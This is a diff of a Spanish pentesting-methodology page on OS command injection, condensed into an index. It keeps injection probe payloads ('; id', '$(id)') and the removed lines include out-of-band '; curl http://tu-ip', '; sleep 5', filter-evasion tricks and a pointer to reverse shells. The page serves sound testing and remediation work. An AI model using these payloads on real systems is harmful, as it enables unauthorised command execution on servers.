@@ -1,4 +1,4 @@
-# Command Injection
+# Command Injection — Índice
 
 - **WSTG:** `WSTG-INPV-12`
 - **OWASP Top 10:** `A03:2021 – Injection`
@@ -6,39 +6,35 @@
 
 ## Qué es
 
-La aplicación pasa entrada del usuario a una llamada del sistema operativo (shell) sin sanitizarla. El atacante encadena comandos propios usando operadores del shell, consiguiendo ejecución de comandos (RCE) en el servidor.
+La app pasa entrada del usuario a una llamada al sistema operativo sin sanitizarla. El atacante encadena comandos con operadores del shell → ejecución de comandos (RCE).
 
-## Cómo detectarla
+## Detección rápida
 
-- Inyecta operadores de encadenamiento en parámetros que puedan acabar en una llamada al SO (ping, conversores, exportadores):
-  `;`, `&&`, `|`, `||`, `` ` ` ``, `$( )`, `%0a` (nueva línea).
-- Confirma con un comando observable: `; id`, `| whoami`, o **out-of-band** si no ves salida: `; ping -c1 tu-ip`, `; curl http://tu-ip`.
-- Blind: usa retardo (`; sleep 5`) o exfiltración por DNS/HTTP.
+```bash
+; id      | id      && id      || id      `id`      $(id)      %0a id
+```
+Sin salida visible → ve a [blind.md](blind.md). Si hay filtros → [bypass.md](bypass.md).
 
-## Cómo explotarla
+## Fichas a fondo
 
-1. Determina el contexto (¿comillas?, ¿Windows o Linux?) y el operador que funciona.
-2. Ejecuta algo inocuo para probar impacto (`id`, `hostname`).
-3. Si hay filtros, evádelos: variables (`c$@at`), codificación, `$IFS` en lugar de espacios, comodines.
-4. Escala a una reverse shell → ver `../../04-cheatsheets/por-fase/03-explotacion.md`.
+| Tema | Ficha |
+|---|---|
+| Command injection ciega (OOB / time) | [blind.md](blind.md) |
+| Evasión de filtros | [bypass.md](bypass.md) |
 
 ## Impacto
 
-Ejecución de comandos arbitrarios en el servidor con los privilegios del servicio web → compromiso total del host, pivote a la red interna. Crítico.
+Ejecución de comandos con los privilegios del servicio web → compromiso del host y pivote. Crítico.
 
-## Cómo remediar
+## Remediación (común)
 
-- Evitar llamar al shell; usar APIs nativas del lenguaje.
-- Si es inevitable, usar funciones que separan comando y argumentos (arrays), nunca concatenar.
-- Lista blanca estricta de valores permitidos.
+- Evitar el shell; usar APIs nativas que separan comando y argumentos (arrays).
+- Nunca concatenar entrada; lista blanca estricta.
 - Mínimo privilegio del servicio.
-
-## Referencias
-
-- OWASP WSTG `WSTG-INPV-12` · CWE-78
-- PortSwigger — OS command injection
 
 ## Enlaces internos
 
+- Payloads: `../../04-cheatsheets/por-vuln/command-injection.md`
 - Checklist: `../../00-metodologia/06-checklists/07-input-validation.md`
-- Redacción para informe: `../../00-metodologia/05-informe/catalogo-redacciones.md`
+- Redacción: `../../00-metodologia/05-informe/catalogo-redacciones.md`
+- Referencias: `WSTG-INPV-12` · CWE-78 · PortSwigger — OS command injection
